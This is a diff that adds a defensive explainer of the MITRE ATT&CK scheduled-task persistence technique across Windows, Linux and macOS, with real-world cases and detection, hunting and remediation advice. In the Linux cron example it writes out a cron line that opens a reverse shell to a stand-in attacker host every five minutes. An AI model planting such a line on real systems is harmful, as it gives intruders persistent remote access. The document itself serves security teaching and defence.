@@ -1,0 +1,47 @@
+**Definition**
+
+T1053 Scheduled Task/Job is an MITRE ATT&CK technique that adversaries use to achieve execution and persistence by abusing operating system task schedulers. This technique covers the creation, modification, or deletion of scheduled tasks on Windows, Linux, and macOS systems. On Windows, this typically involves the Task Scheduler service (schtasks.exe or the Task Scheduler API). On Linux, cron jobs and systemd timers are the primary vectors. On macOS, launchd jobs and cron are used. The core objective is to execute arbitrary code at a defined time or in response to a system event, often to maintain persistence after a reboot or to stage a secondary payload.
+
+**Key Components**
+
+- **Task Scheduler (Windows):** The Windows Task Scheduler stores tasks in XML format under `%SystemRoot%\System32\Tasks\`. Tasks can be created via the GUI (taskschd.msc), command line (schtasks.exe), or programmatically via the ITaskScheduler COM interface. Adversaries commonly use schtasks.exe with the `/CREATE` flag, specifying triggers (e.g., logon, idle, daily) and actions (e.g., execute a binary, run a script). Tasks can run with SYSTEM, Administrator, or user-level privileges depending on the configured security context.
+
+- **Cron (Linux/Unix):** Cron jobs are defined in crontab files located in `/etc/crontab`, `/etc/cron.d/`, or user-specific spool files under `/var/spool/cron/crontabs/`. The cron daemon parses these files and executes commands at specified intervals. Adversaries often add a single line to a crontab file to run a reverse shell or download a payload at reboot (`@reboot`) or at a regular interval (e.g., `*/5 * * * *`).
+
+- **Systemd Timers (Linux):** Modern Linux distributions use systemd timers as an alternative to cron. Timers are unit files with a `.timer` extension, stored in `/etc/systemd/system/` or `/usr/lib/systemd/system/`. They trigger associated `.service` units. Adversaries may create a timer that activates a malicious service on boot or at a specific time. Timers can be more stealthy than cron because they are not listed in crontab files and require `systemctl list-timers` to enumerate.
+
+- **Launchd (macOS):** macOS uses launchd for both scheduled and on-demand job execution. Jobs are defined in property list (plist) files located in `/System/Library/LaunchDaemons/`, `/Library/LaunchDaemons/`, or `~/Library/LaunchAgents/`. Adversaries often place a plist file with a `KeepAlive` or `StartInterval` key to ensure persistent execution. The `launchctl load` command activates the job.
+
+- **Triggers and Conditions:** Scheduled tasks can be triggered by time-based events (e.g., daily at 3:00 AM), system events (e.g., user logon, system startup, idle time), or custom conditions (e.g., network availability, battery status). Adversaries frequently use logon or startup triggers to re-establish access after a reboot.
+
+- **Execution Context:** The task runs under a specified user account. High-integrity tasks (e.g., SYSTEM) allow privilege escalation if the adversary can create a task that runs with higher privileges than the current user. Misconfigured tasks with weak permissions on the task definition file or the executable path are common escalation vectors.
+
+**Real-World Application**
+
+- **Emotet and TrickBot:** These malware families have historically used scheduled tasks to maintain persistence. Emotet creates a task named something like "AdobeFlashUpdate" that runs a JavaScript or VBScript loader every 15 minutes. The task is often hidden by using a legitimate-looking name and setting the task to run with the highest privileges.
+
+- **APT29 (Cozy Bear):** In campaigns targeting government and research organizations, APT29 has used scheduled tasks to execute PowerShell scripts that download and run Cobalt Strike beacons. They frequently use `schtasks /create` with the `ONLOGON` trigger and a delay to evade sandbox analysis.
+
+- **Linux Cron Backdoors:** Adversaries compromising Linux servers (e.g., web servers, database servers) often add a cron job that executes a reverse shell command. A common example is adding `*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'` to the root crontab. This provides persistent access even if the initial exploit vector is patched.
+
+- **Ransomware Deployment:** Some ransomware groups use scheduled tasks to execute the encryption binary at a specific time, often outside business hours. They may also create a task that deletes itself after execution to reduce forensic artifacts.
+
+- **Living off the Land:** Security engineers should note that adversaries frequently use native tools (schtasks.exe, crontab, launchctl) rather than custom binaries. This blends in with normal administrative activity and bypasses application whitelisting solutions that only block unknown executables.
+
+**Security Relevance**
+
+- **Detection:** Monitor for creation of scheduled tasks via Event ID 4698 (Windows Security Log) and Event ID 106 (Task Scheduler Operational Log). On Linux, monitor crontab file modifications using file integrity monitoring (e.g., auditd, osquery). On macOS, monitor plist file creation in LaunchDaemon and LaunchAgent directories. Correlate task creation with known administrative activity to reduce false positives.
+
+- **Hunting:** Look for tasks with suspicious characteristics: tasks that execute from user-writable directories (e.g., `%TEMP%`, `%APPDATA%`), tasks with obfuscated command lines, tasks that run with SYSTEM privileges but were created by a non-admin user, or tasks with names mimicking legitimate software (e.g., "WindowsUpdate", "GoogleUpdate"). On Linux, check for cron jobs that execute base64-encoded commands or download files from external IPs.
+
+- **Prevention:** Restrict who can create scheduled tasks. On Windows, use Group Policy to limit Task Scheduler permissions to authorized administrators. On Linux, restrict write access to crontab directories and systemd unit directories. Implement application control policies that block execution of scripts from untrusted locations, even if invoked by a scheduled task.
+
+- **Remediation:** When a malicious scheduled task is identified, disable and delete the task. On Windows, use `schtasks /delete /tn "taskname" /f`. On Linux, remove the crontab entry or delete the systemd timer unit. Verify that no other persistence mechanisms exist, as adversaries often deploy multiple methods. Check for associated files (scripts, binaries) referenced by the task and remove them.
+
+- **Forensic Artifacts:** Scheduled tasks leave persistent artifacts. On Windows, the XML task definition files remain on disk even after the task is deleted if not explicitly removed. On Linux, crontab entries are stored in plaintext. Systemd timer units are also plaintext files. These artifacts provide valuable evidence for incident response.
+
+**Key Takeaways**
+
+1. Scheduled tasks are a common persistence mechanism across all major operating systems, and adversaries frequently abuse native tools (schtasks, crontab, launchctl) to blend in with normal administrative activity.
+2. Detection relies on monitoring specific event IDs (Windows 4698, 106) and file integrity alerts for crontab and plist files, combined with behavioral analysis of task characteristics such as execution path, privilege level, and naming conventions.
+3. Prevention requires strict access controls on task creation, application whitelisting for executed binaries, and regular auditing of all scheduled tasks to identify unauthorized or suspicious entries.
